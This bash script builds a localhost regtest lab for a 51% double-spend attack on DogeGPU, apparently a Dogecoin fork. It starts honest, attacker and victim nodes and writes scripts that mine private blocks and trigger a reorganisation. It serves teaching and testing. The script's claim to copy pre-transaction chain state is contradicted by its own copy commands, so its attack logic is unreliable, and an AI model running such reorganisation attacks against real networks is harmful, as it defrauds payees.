#!/bin/bash

# DogeGPU 51% Attack Testing Setup Script
# WARNING: Only use on private testnets!

set -e

echo "=== DogeGPU 51% Attack Testing Setup ==="
echo "WARNING: This is for educational purposes only!"
echo "Only use on private networks you own."
echo ""

# Configuration
BASE_DIR="$HOME/dogpu_attack_test"
DOGPU_DIR="/workspace/Dogpu/DogeGPU-master"

# Create directory structure
echo "Creating test environment..."
mkdir -p "$BASE_DIR"/{honest_node,attacker_node,observer_node}
mkdir -p "$BASE_DIR"/{honest_node,attacker_node,observer_node}/data

# Function to start a node
start_node() {
    local name=$1
    local port=$2
    local rpcport=$3
    local datadir="$BASE_DIR/${name}/data"
    local extra_args=$4
    
    echo "Starting $name on port $port, RPC port $rpcport..."
    cd "$DOGPU_DIR"
    
    ./src/dogpud -regtest \
        -datadir="$datadir" \
        -port=$port \
        -rpcport=$rpcport \
        -rpcuser=test \
        -rpcpassword=test123 \
        -rpcallowip=127.0.0.1 \
        -daemon \
        -printtoconsole=0 \
        $extra_args
    
    sleep 2
}

# Function to execute RPC command
rpc_call() {
    local rpcport=$1
    shift
    cd "$DOGPU_DIR"
    ./src/dogpu-cli -regtest -rpcport=$rpcport -rpcuser=test -rpcpassword=test123 "$@"
}

# Build DogeGPU if needed
if [ ! -f "$DOGPU_DIR/src/dogpud" ]; then
    echo "Building DogeGPU..."
    cd "$DOGPU_DIR"
    ./autogen.sh
    ./configure --disable-wallet --disable-gui --disable-tests --disable-bench
    make -j$(nproc)
fi

# Start nodes
echo ""
echo "=== Starting Test Nodes ==="

# Start honest node
start_node "honest_node" 18444 18443 ""

# Start attacker node (isolated initially)
start_node "attacker_node" 18445 18446 "-connect=0"

# Start observer node
start_node "observer_node" 18447 18448 ""

echo ""
echo "=== Nodes Started ==="
echo "Honest Node:   Port 18444, RPC 18443"
echo "Attacker Node: Port 18445, RPC 18446 (isolated)"
echo "Observer Node: Port 18447, RPC 18448"

# Connect honest and observer nodes
echo ""
echo "Connecting honest and observer nodes..."
rpc_call 18443 addnode "127.0.0.1:18447" add
rpc_call 18448 addnode "127.0.0.1:18444" add

# Generate initial blockchain on honest node
echo ""
echo "=== Setting Up Initial Blockchain ==="
echo "Generating 101 blocks on honest node..."
rpc_call 18443 generate 101

# Wait for sync
sleep 5

# Check sync status
echo ""
echo "=== Blockchain Status ==="
echo "Honest node blocks: $(rpc_call 18443 getblockcount)"
echo "Observer node blocks: $(rpc_call 18448 getblockcount)"
echo "Attacker node blocks: $(rpc_call 18446 getblockcount)"

# Create attack scenario setup
echo ""
echo "=== Setting Up Attack Scenario ==="

# Create addresses
HONEST_ADDR=$(rpc_call 18443 getnewaddress)
VICTIM_ADDR=$(rpc_call 18448 getnewaddress)

echo "Honest node address: $HONEST_ADDR"
echo "Victim address: $VICTIM_ADDR"

# Send coins to victim (this will be the transaction we double-spend)
echo ""
echo "Creating transaction to double-spend..."
TXID=$(rpc_call 18443 sendtoaddress "$VICTIM_ADDR" 50)
echo "Transaction ID: $TXID"

# Mine the transaction
echo "Mining transaction into blockchain..."
rpc_call 18443 generate 1

# Wait for sync
sleep 3

echo ""
echo "=== Attack Setup Complete ==="
echo ""
echo "Current blockchain state:"
echo "Honest node blocks: $(rpc_call 18443 getblockcount)"
echo "Observer node blocks: $(rpc_call 18448 getblockcount)"
echo "Victim balance: $(rpc_call 18448 getbalance)"

# Save the current state for attacker
echo ""
echo "Saving blockchain state for attacker..."
CURRENT_HEIGHT=$(rpc_call 18443 getblockcount)
ATTACK_FROM_HEIGHT=$((CURRENT_HEIGHT - 1))

# Copy blockchain state to attacker (before the transaction)
echo "Copying blockchain state to attacker node..."
rpc_call 18446 stop 2>/dev/null || true
sleep 3

# Copy the blockchain data up to the point before our transaction
cp -r "$BASE_DIR/honest_node/data/regtest/blocks" "$BASE_DIR/attacker_node/data/regtest/" 2>/dev/null || true
cp -r "$BASE_DIR/honest_node/data/regtest/chainstate" "$BASE_DIR/attacker_node/data/regtest/" 2>/dev/null || true

# Restart attacker node
start_node "attacker_node" 18445 18446 "-connect=0"

echo ""
echo "=== Ready for Attack! ==="
echo ""
echo "To execute a 51% attack:"
echo "1. Mine blocks privately on attacker node:"
echo "   ./attack_scripts/mine_private.sh"
echo ""
echo "2. Connect attacker to network to trigger reorganization:"
echo "   ./attack_scripts/release_attack.sh"
echo ""
echo "3. Monitor the attack:"
echo "   ./attack_scripts/monitor_attack.sh"

# Create attack scripts
mkdir -p "$BASE_DIR/attack_scripts"

# Script 1: Mine private blocks
cat > "$BASE_DIR/attack_scripts/mine_private.sh" << 'EOF'
#!/bin/bash
DOGPU_DIR="/workspace/Dogpu/DogeGPU-master"
cd "$DOGPU_DIR"

echo "Mining blocks privately on attacker node..."
echo "Current attacker height: $(./src/dogpu-cli -regtest -rpcport=18446 -rpcuser=test -rpcpassword=test123 getblockcount)"

# Mine more blocks than the honest network
echo "Mining 5 blocks privately..."
./src/dogpu-cli -regtest -rpcport=18446 -rpcuser=test -rpcpassword=test123 generate 5

echo "Attacker now has $(./src/dogpu-cli -regtest -rpcport=18446 -rpcuser=test -rpcpassword=test123 getblockcount) blocks"
echo "Honest network has $(./src/dogpu-cli -regtest -rpcport=18443 -rpcuser=test -rpcpassword=test123 getblockcount) blocks"
echo ""
echo "Ready to release attack! Run: ./release_attack.sh"
EOF

# Script 2: Release attack
cat > "$BASE_DIR/attack_scripts/release_attack.sh" << 'EOF'
#!/bin/bash
DOGPU_DIR="/workspace/Dogpu/DogeGPU-master"
cd "$DOGPU_DIR"

echo "=== RELEASING 51% ATTACK ==="
echo ""
echo "Before attack:"
echo "Honest network height: $(./src/dogpu-cli -regtest -rpcport=18443 -rpcuser=test -rpcpassword=test123 getblockcount)"
echo "Attacker height: $(./src/dogpu-cli -regtest -rpcport=18446 -rpcuser=test -rpcpassword=test123 getblockcount)"
echo "Victim balance: $(./src/dogpu-cli -regtest -rpcport=18448 -rpcuser=test -rpcpassword=test123 getbalance)"

echo ""
echo "Connecting attacker to network..."
./src/dogpu-cli -regtest -rpcport=18446 -rpcuser=test -rpcpassword=test123 addnode "127.0.0.1:18444" add

echo "Waiting for reorganization..."
sleep 10

echo ""
echo "After attack:"
echo "Honest network height: $(./src/dogpu-cli -regtest -rpcport=18443 -rpcuser=test -rpcpassword=test123 getblockcount)"
echo "Attacker height: $(./src/dogpu-cli -regtest -rpcport=18446 -rpcuser=test -rpcpassword=test123 getblockcount)"
echo "Victim balance: $(./src/dogpu-cli -regtest -rpcport=18448 -rpcuser=test -rpcpassword=test123 getbalance)"

echo ""
if [ "$(./src/dogpu-cli -regtest -rpcport=18448 -rpcuser=test -rpcpassword=test123 getbalance)" == "0.00000000" ]; then
    echo "🎯 ATTACK SUCCESSFUL! Victim's transaction was reversed!"
else
    echo "❌ Attack failed. Transaction still exists."
fi
EOF

# Script 3: Monitor attack
cat > "$BASE_DIR/attack_scripts/monitor_attack.sh" << 'EOF'
#!/bin/bash
DOGPU_DIR="/workspace/Dogpu/DogeGPU-master"
cd "$DOGPU_DIR"

echo "=== Monitoring Network Status ==="
echo ""

while true; do
    clear
    echo "=== DogeGPU Network Monitor ==="
    echo "Time: $(date)"
    echo ""
    
    HONEST_HEIGHT=$(./src/dogpu-cli -regtest -rpcport=18443 -rpcuser=test -rpcpassword=test123 getblockcount 2>/dev/null || echo "ERROR")
    ATTACKER_HEIGHT=$(./src/dogpu-cli -regtest -rpcport=18446 -rpcuser=test -rpcpassword=test123 getblockcount 2>/dev/null || echo "ERROR")
    OBSERVER_HEIGHT=$(./src/dogpu-cli -regtest -rpcport=18448 -rpcuser=test -rpcpassword=test123 getblockcount 2>/dev/null || echo "ERROR")
    VICTIM_BALANCE=$(./src/dogpu-cli -regtest -rpcport=18448 -rpcuser=test -rpcpassword=test123 getbalance 2>/dev/null || echo "ERROR")
    
    echo "Honest Node Height:   $HONEST_HEIGHT"
    echo "Attacker Height:      $ATTACKER_HEIGHT"
    echo "Observer Height:      $OBSERVER_HEIGHT"
    echo "Victim Balance:       $VICTIM_BALANCE DOGPU"
    echo ""
    
    # Check for reorganization
    if [ "$HONEST_HEIGHT" != "$OBSERVER_HEIGHT" ]; then
        echo "⚠️  REORGANIZATION DETECTED!"
    fi
    
    if [ "$VICTIM_BALANCE" == "0.00000000" ]; then
        echo "🎯 DOUBLE-SPEND SUCCESSFUL!"
    fi
    
    echo ""
    echo "Press Ctrl+C to stop monitoring"
    sleep 5
done
EOF

# Make scripts executable
chmod +x "$BASE_DIR/attack_scripts"/*.sh

echo ""
echo "Attack scripts created in: $BASE_DIR/attack_scripts/"
echo ""
echo "=== Next Steps ==="
echo "1. cd $BASE_DIR/attack_scripts"
echo "2. ./mine_private.sh      # Mine blocks privately"
echo "3. ./release_attack.sh    # Execute the attack"
echo "4. ./monitor_attack.sh    # Watch the results"
echo ""
echo "=== Cleanup ==="
echo "To stop all nodes: pkill dogpud"
echo "To clean up: rm -rf $BASE_DIR"